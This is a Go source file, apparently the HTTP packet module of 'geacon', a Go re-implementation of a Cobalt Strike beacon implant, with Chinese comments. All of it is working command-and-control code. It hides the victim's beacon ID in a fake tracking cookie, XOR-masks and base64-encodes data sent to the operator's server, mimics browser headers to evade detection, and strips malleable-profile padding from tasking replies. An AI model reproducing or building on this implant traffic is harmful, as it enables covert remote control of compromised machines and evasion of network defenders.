package packet

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"geacon/config"
	"github.com/imroc/req"
	"io/ioutil"
	"net/http"
	"time"
)

var (
	httpRequest = req.New()
)

func init() {
	httpRequest.SetTimeout(config.TimeOut * time.Second)
	trans, _ := httpRequest.Client().Transport.(*http.Transport)
	trans.MaxIdleConns = 20
	trans.TLSHandshakeTimeout = config.TimeOut * time.Second
	trans.DisableKeepAlives = true
	trans.TLSClientConfig = &tls.Config{InsecureSkipVerify: config.VerifySSLCert}
}

// 添加netbios 加密方法
func NetbiosEncode(data []byte) string {
	q := ""
	for _, value := range data {
		q += string((int(value)>>4)+int('a')) + string((int(value)&0xf + int('a')))
	}
	return q
}

// 添加mask 加解密算法
func maskDec(data []byte) []byte {
	key := data[:4]
	realData := data[4:]
	resData := make([]byte, len(realData))
	for i := range realData {
		resData[i] = realData[i] ^ key[(i+4)%4]
		//fmt.Printf("%d^%d\n",data[i],key[(i+4)%4])
	}
	return resData
}
func maskEnc(data []byte) []byte {
	// 生成个四位的随机数组
	key := [4]byte{}
	rand.Read(key[:])
	resData := make([]byte, len(data)+4)
	for i := range key {
		resData[i] = key[i]
	}
	for i := 4; i < len(resData); i++ {
		resData[i] = data[i-4] ^ key[i%4]
		//fmt.Printf("%d^%d\n",data[i-4],key[i%4])
	}
	return resData
}

// TODO c2profile
func HttpPost(url string, id string, data []byte) *req.Resp {
	httpHeaders := req.Header{
		"User-Agent":      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
		"Accept-Encoding": "gzip, deflate, br",
		"Cookie":          "__yjs_duid=" + NetbiosEncode([]byte(id)), //netbios 编码id
	}
	data = []byte("data=jHER9HcVz8F" + base64.RawURLEncoding.EncodeToString(maskEnc(data)) + "DtaMO/w5PfDqcO72w5XDmMO")
	for {
		resp, err := httpRequest.Post(url, data, httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				// 这里要根据cs profile里设置的返回包前后添加的字符长度来修改，这次profile 前边加了491个字符后边加了55个字符
				oldData, _ := ioutil.ReadAll(resp.Response().Body)
				//删除前后缀
				newData := oldData[491 : resp.Response().ContentLength-55]
				//fmt.Printf("newData:\t%s\n", newData)
				//Base64url解码
				newDataDecBase64url, _ := base64.RawURLEncoding.DecodeString(string(newData))
				//mask解码
				newDataDec := maskDec(newDataDecBase64url)

				resp.Response().Body = ioutil.NopCloser(bytes.NewBuffer(newDataDec))
				resp.Response().ContentLength = int64(len(newDataDec))
				return resp
			}
			break
		}
	}

	return nil
}
func HttpGet(url string, cookies string) *req.Resp {
	httpHeaders := req.Header{
		"User-Agent":      "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/14.0.835.163 Safari/535.1",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7",
		"Accept-Encoding": "gzip, deflate, br",
	}
	for {
		resp, err := httpRequest.Get(url+"Zx8YC"+cookies+"UuAx", httpHeaders)
		if err != nil {
			fmt.Printf("!error: %v\n", err)
			time.Sleep(config.WaitTime)
			continue
			//panic(err)
		} else {
			if resp.Response().StatusCode == http.StatusOK {
				//close socket
				// 这里要根据cs profile里设置的返回包前后添加的字符长度来修改，这次profile 前边加了16个字符后边加了15个字符
				oldData, _ := ioutil.ReadAll(resp.Response().Body)
				//删除前后缀
				newData := oldData[16 : resp.Response().ContentLength-15]
				//Base64url解码
				newDataDec, _ := base64.RawURLEncoding.DecodeString(string(newData))
				resp.Response().Body = ioutil.NopCloser(bytes.NewBuffer(newDataDec))
				resp.Response().ContentLength = int64(len(newDataDec))
				//fmt.Printf("respDataDec:\t%s\n", resp.Response().Body)
				return resp
			}

			break
		}
	}
	return nil
}
